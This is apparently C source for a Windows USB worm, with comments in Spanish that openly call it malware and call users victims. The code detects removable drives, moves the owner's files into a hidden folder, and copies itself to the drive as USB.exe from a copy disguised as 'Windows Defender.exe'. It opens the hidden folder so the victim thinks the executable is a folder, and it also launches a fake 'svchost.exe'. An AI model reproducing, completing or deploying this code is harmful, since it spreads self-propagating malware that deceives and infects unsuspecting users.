//#include <dirent.h>//libreria necesaria para listar archivos y carpetas con POSIX
//#include <errno.h>//necesaria para la funcion CheckInfectedUSB
//#include "os_check.h"
//1 crea carpetas
int CreatePathForUSB(char*);
int SetAttributePath(char*);
int GotoInfectedUSB(char*);
int MoveDataUSB(char*,char*);
int CheckInfectedUSB(char*);
int OpenDirFake();
int CopySnowDog(char*);
int DetectedUSB(HWND hwnd);
bool IsRuningW(WCHAR* FileName);
int RunTimeEnableDirPath();
int RunTimeEnableNameFile();
int RunExplorerProcess();

int CreatePathForUSB(char *USBRuta){
    char NamePath[]="8:\\datos";/*path statico que contiene el buffer necesario
                                para guardar la ruta donde se creara la carpeta*/

    NamePath[0]=USBRuta[0];        /*le asignamos la letra de la USB a infectar
                                al path statico*/

    CreateDirectory(NamePath,0);/*ejecutamos la api de windows CreateDirectory
                                la cual creara la carpeta*/
    return 8;
}


//2 setea atributos a carpetas (las hace ocultas)
int SetAttributePath(char *USBRuta){
    char NamePath[]="8:\\datos";/*path statico que contiene el buffer necesario
                                para guardar la ruta donde se creara la carpeta*/

    NamePath[0]=USBRuta[0];         /*le asignamos la letra de la USB a infectar
                                  al path statico*/

    SetFileAttributes(NamePath,2);/*ejecutamos la api de windows SetFileAttributes
                                  la cual ocultara la carpeta*/
    return 8;
}

//esta funcion se encarga de realizar todas
//las llamadas a funciones que llegase a necesitar
//para infectar la memoria USB que no esten infectadas
int GotoInfectedUSB(char *USBRuta){
    char PathUSB[256]="8:\\";
    char PathUSBStatic[]="8:\\";
    PathUSB[0]=USBRuta[0];
    PathUSBStatic[0]=USBRuta[0];
    DIR *d=opendir(PathUSB);//aqui va el path
    struct dirent *dentry;
    size_t i=1;
    while((dentry=readdir(d))!=NULL){
        //strcat(PathUSB,dentry->d_name);
                                        /*concatena cadenas de carcteres
                                        aqui unimos la ruta de la USB y el
                                        nombre que me liste uno x uno ejemplo
                                        USB =J:\ y nombre de archivo 1 seria
                                        p1.exe quedaria J:\p1.exe para usarlo
                                        como ruta origen */
        //Pass1=dentry->d_name;
        MoveDataUSB(dentry->d_name,PathUSBStatic);
        //printf("%u. %s\n",i,PathUSB);
        //strcpy(PathUSB,PathUSBStatic);
                                        /*aqui lo que hacemos es vaciar el buffer
                                        de PathUSB ya que si no hicieramos esto
                                        la ruta proxima del siguiente archivo
                                        quedaria asi J:\p1.exep2.exe
                                        al vaciarla queda asi J:\ ya solo para que
                                        se concatene con el siguiente archivo para quedar
                                        asi J:\p2.exe
                                        */
        //i++;
    }
    CopySnowDog(PathUSBStatic);
    //invocamos a la funcion que copiara a snowdog.exe
}

//mueve archivos y carpetas a otras carpetas
int MoveDataUSB(char *NameToMove,char *rUSB){
    //printf("run MoveDataUSB\n");
    char origen[256]="8:\\";
    char destino[256]="8:\\datos\\";
    origen[0]=rUSB[0];
    destino[0]=rUSB[0];
    strcat(origen,NameToMove);
    strcat(destino,NameToMove);
    MoveFile(origen,destino);
    printf("origen:\"%s\"\ndestino:\"%s\"\n",origen,destino);
    return 8;
}

//checkea la firma del malware en la USB
//si no esta infectada la infecta
//si ya esta infecta solo mueve los archivos a
//la carpeta de infeccion
int CheckInfectedUSB(char *USB){
    char NamePath[]="8:\\USB.exe";
    char Dirpath[]="8:\\datos";
    NamePath[0]=USB[0];
    FILE *f=NULL;
    FILE *fdir=NULL;
    //printf("antes de fopen\n");
    //try{
        f=fopen(NamePath,"r");
        /*if(f==0)throw 3;
    }catch(int error){
        if(error==3){
            printf("\"%s\" es posible que sea una unidad de disquet\n",USB);
            return 1;
        }
    }
    */
    //f=fopen(NamePath,"r");
    //printf("despues de fopen\n");
    //printf("valor de f=open\"%d\"\n",f);
    if(f==NULL&&errno==ENOENT){
        return 8;//devuelve un 8 si la USB no esta Infectada
    }
    else{
        //abrirlo y conprobar firma del malwared
        fclose(f);

        //aqui comprobamos que exista la carpeta
        //oculta si no exite la creamos y la seteamos a oculta
        //;
        Dirpath[0]=USB[0];
        fdir=fopen(Dirpath,"r");
        if(fdir==NULL&&errno==ENOENT){
            CreatePathForUSB(USB);
            SetAttributePath(USB);
            //return 8;//devuelve un 0 si la carpeta datos no existe
        }
        //aqui comprobamos que la victima no tenga archivos en
        //la raiz USB, si tiene archivos los movemos a la carpeta oculta
        GotoInfectedUSB(USB);
        return 1;//devuelve un 1 si la USB esta infectada
    }
}

//esta funcion lo que hace es abrir
//la carpeta oculta donde se ha copiado todo el contenido
//de la memoria USB infectada para que cuando la victima
//abra el .exe piense que acaba de abrir una carpeta
int OpenDirFake(){
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *lop=((char*)"C:\\Windows\\explorer.exe datos");
    ZeroMemory(&si,sizeof(si));
    si.cb=sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    if(!
    CreateProcess(NULL,
                  lop,NULL,NULL,NULL,
                  NULL,NULL,NULL,
                  &si,
                  &pi
                  )
                  )
                  {
        //error al crear el proceso
        printf("error\n");
    }
    else{
        return 8;
        //
    }
}

//se encarda de copiar a snowdog de la pc infecta
//a una memoria USB no infectada
int CopySnowDog(char *letraUSB){
    //printf("run CopySnowDog\n");
    char origen[512]="";
    //strcpy(origen,"");
    strcat(origen,getenv("SystemDrive"));
    strcat(origen,getenv("HomePath"));
    strcat(origen,"\\");
    strcat(origen,"Windows Defender.exe");
    char destino[]="8:\\USB.exe";
    destino[0]=letraUSB[0];
    CopyFile(origen,destino,0);
    printf("origen:\"%s\"\ndestino:\"%s\"\n",origen,destino);
    return 8;
}
//detecta Memorias USB
int DetectedUSB(HWND hwnd){
    char letra;
    char ruta[]="8:\\";
    int kk=0;
    for(letra='C';letra<='Z';letra++){
        //ruta=letra;
        ruta[0]=letra;
        //printf("%s\n",ruta);
        kk=GetDriveType(ruta);
        //printf("return getdrivetype()=%d\n",kk);
        if(kk==DRIVE_REMOVABLE){
            //printf("%c:\\ Es una memoria USB\n",letra);
            //MessageBox(hwnd,ruta, "Aviso: Se conecto una unidad USB en la etiqueta:",MB_OK | MB_ICONWARNING );
            //aki va el codigo para infectar la USB

            if(CheckInfectedUSB(ruta)==8){

                CreatePathForUSB(ruta);//crea la carpeta que contendra todos
                                            //sus archivos y carpetas de la USB
                SetAttributePath(ruta);//seteo la carpeta en oculta
                GotoInfectedUSB(ruta);
            }
        }
    }
    //_sleep(2000);
    //Sleep(2000);
}


int RunVigiaProcess(){
    //system("svchost.exe v");

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char asd[256]="";
    strcat(asd,getenv("SystemDrive"));
    strcat(asd,getenv("HomePath"));
    strcat(asd,"\\svchost.exe 1");
    char *lop;
    lop=&asd[0];
    //printf("%s\n",asd);
    //printf("%s\n",lop);
    ZeroMemory(&si,sizeof(si));
    si.cb=sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    if(!
    CreateProcess(NULL,
                  lop,NULL,NULL,NULL,
                  NULL,NULL,NULL,
                  &si,
                  &pi
                  )
                  )
                  {
        //error al crear el proceso
        printf("error\n");
    }
    else{
        return 8;
        //
    }
}

bool IsRuningW(WCHAR* FileName){
   PROCESSENTRY32W Proceso;
   HANDLE ProcessHandle;
   bool Result = false;

   Proceso.dwSize = sizeof(PROCESSENTRY32W);
   ProcessHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if(Process32FirstW(ProcessHandle, &Proceso)){
     do{
       if(!_wcsicmp(Proceso.szExeFile, FileName)){
         Result = true;
         break;
       }
     }while(Process32NextW(ProcessHandle, &Proceso));
   }
   CloseHandle(ProcessHandle);
   return Result;
}

int RunTimeEnableDirPath(){
    char pathD[256];
    HMODULE nombre=GetModuleHandle(0);
    GetModuleFileName(nombre,pathD,256);
    printf("%s\n",pathD);
    printf("caracteres %d\n",strlen(pathD));
    if(strlen(pathD)==10){
        return 8;
    }
    return 0;
}

int RunTimeEnableNameFile(){
    char pathD[256];
    char paths[256];
    char static_name[]="Windows Defender.exe";
    int i=0,s=0;
    HMODULE nombre=GetModuleHandle(0);
    GetModuleFileName(nombre,pathD,256);
    while(i<=strlen(pathD)){
        if(pathD[i]=='\\'){
            //strcpy(paths,"");
            s=0;
            i=i+1;
        }
        paths[s]=pathD[i];
        i++;
        s++;
    }
    paths[s+1]='0';
    printf("%s\n",pathD);
    printf("%s\n",paths);
    i=0;
    while(i<20){
        if(paths[i]==static_name[i]){
            //printf("int   paths[%d]==static_name[%d]\n",i,i);
            //printf("ascii paths[%c]==static_name[%c]\n",paths[i],static_name[i]);
            i++;
        }
        else{
            //printf("else int   paths[%d]==static_name[%d]\n",i,i);
            //printf("else ascii paths[%c]==static_name[%c]\n",paths[i],static_name[i]);
            return 1;
        }

    }
    //printf("i=%d\n",i);
    if(i==20){
        return 8;
    }
    //printf("caracteres %d\n",strlen(paths));
    //printf("%d\n",strlen(paths));
    /*
    if(strlen(paths)==8){

        return 8;
    }
    return 0;
    */
}

int RunExplorerProcess(){
    //system("svchost.exe v");

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char asd[256]="explorer.exe";
    //strcat(asd,getenv("SystemDrive"));
    //strcat(asd,getenv("HomePath"));
    //strcat(asd,"\\svchost.exe 1");
    char *lop;
    lop=&asd[0];
    //printf("%s\n",asd);
    //printf("%s\n",lop);
    ZeroMemory(&si,sizeof(si));
    si.cb=sizeof(si);
    ZeroMemory(&pi,sizeof(pi));
    if(!
    CreateProcess(NULL,
                  lop,NULL,NULL,NULL,
                  NULL,NULL,NULL,
                  &si,
                  &pi
                  )
                  )
                  {
        //error al crear el proceso
        printf("error\n");
    }
    else{
        return 8;
        //
    }
}

int INfecMetodoNasa(){

}

